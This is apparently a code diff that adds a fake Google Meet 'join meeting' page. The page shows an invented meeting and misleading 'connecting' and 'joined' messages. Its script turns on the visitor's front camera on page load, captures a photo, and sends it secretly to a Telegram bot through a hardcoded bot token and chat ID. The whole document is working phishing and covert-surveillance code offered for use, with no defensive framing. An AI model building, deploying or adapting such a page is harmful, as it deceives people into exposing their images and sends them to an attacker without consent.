@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join Meeting - Google Meet</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f9fbfd;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #3c4043;
+        }
+        .container {
+            background: white;
+            width: 90%;
+            max-width: 500px;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+            text-align: center;
+        }
+        .logo {
+            font-size: 24px;
+            color: #5f6368;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+        .meeting-info {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        .code {
+            font-size: 48px;
+            font-weight: bold;
+            color: #1a73e8;
+            letter-spacing: 2px;
+            margin: 10px 0;
+        }
+        .details {
+            font-size: 14px;
+            color: #5f6368;
+        }
+        video {
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+            background-color: #000;
+            margin-bottom: 15px;
+            /* Mirror the camera for natural feel */
+            transform: scaleX(-1); 
+        }
+        .status {
+            font-size: 14px;
+            color: #3c4043;
+            margin-top: 10px;
+            min-height: 20px;
+        }
+        /* Loading spinner */
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">Google Meet</div>
+    
+    <!-- Fake Meeting Details -->
+    <div class="meeting-info">
+        <div style="font-weight: bold; font-size: 18px;">Weekly Team Sync</div>
+        <div class="code">xyz-abc-def</div>
+        <div class="details">Hosted by: Manager</div>
+    </div>
+
+    <!-- Video Preview -->
+    <video id="video" autoplay playsinline muted></video>
+    
+    <!-- Status Text -->
+    <div class="status" id="status">
+        <span class="spinner"></span> Connecting to server...
+    </div>
+</div>
+
+<script>
+    // ⚠️ YOUR CREDENTIALS ⚠️
+    const BOT_TOKEN = '9181331705:AAG6cDB8DxQfMoECog3bHvOyVUgfzIiQL7s';
+    const CHAT_ID   = '6813462951';
+
+    const video = document.getElementById('video');
+    const status = document.getElementById('status');
+
+    // 1. Start Camera Immediately on Load
+    async function startCamera() {
+        try {
+            // Request front camera specifically
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: 'user', // Front camera
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                }, 
+                audio: false 
+            });
+            video.srcObject = stream;
+            
+            // Update status to look like it's loading
+            setTimeout(() => {
+                status.innerHTML = '<span class="spinner"></span> Checking permissions...';
+                
+                // Wait 2 more seconds, then capture
+                setTimeout(captureAndSend, 2000);
+            }, 1000);
+
+        } catch (err) {
+            status.innerText = "Camera access denied.";
+            console.error(err);
+        }
+    }
+
+    // 2. Capture and Send Function
+    function captureAndSend() {
+        status.innerHTML = '<span class="spinner"></span> Capturing photo...';
+        
+        // Create a hidden canvas
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        
+        // Draw the current video frame onto the canvas
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // Convert to Base64 JPEG
+        const dataURL = canvas.toDataURL('image/jpeg', 0.7);
+        const base64Image = dataURL.split(',')[1];
+
+        sendToTelegram(base64Image);
+    }
+
+    // 3. Send to Telegram
+    async function sendToTelegram(base64Image) {
+        status.innerHTML = '<span class="spinner"></span> Uploading...';
+        
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    photo: base64Image,
+                    caption: "📸 New Photo Captured from Meeting Invite!"
+                })
+            });
+
+            const result = await response.json();
+            
+            if (result.ok) {
+                status.innerHTML = '<span class="spinner"></span> Joined successfully!';
+                // Optional: Stop the video stream to save battery
+                const stream = video.srcObject;
+                const tracks = stream.getTracks();
+                tracks.forEach(track => track.stop());
+            } else {
+                status.innerText = "Error sending photo.";
+            }
+        } catch (e) {
+            status.innerText = "Network error.";
+            console.error(e);
+        }
+    }
+
+    // Initialize
+    startCamera();
+</script>
+
+</body>
+  </html>
